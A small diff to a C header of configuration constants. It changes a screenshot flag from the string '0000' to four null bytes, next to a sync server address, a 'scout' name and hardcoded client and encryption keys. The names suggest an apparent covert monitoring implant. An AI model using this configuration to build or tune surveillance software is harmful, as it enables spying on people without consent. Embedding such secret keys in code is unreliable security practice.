@@ -12,7 +12,7 @@
 #define WMARKER				"B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW"
 #define SYNC_SERVER			"192.168.100.100"
 #define SCOUT_NAME			"pippopippo"
-#define SCREENSHOT_FLAG		"0000"
+#define SCREENSHOT_FLAG		"\x00\x00\x00\x00"
 #else
 #define CLIENT_KEY			"ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ"
 #define ENCRYPTION_KEY		"WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg"
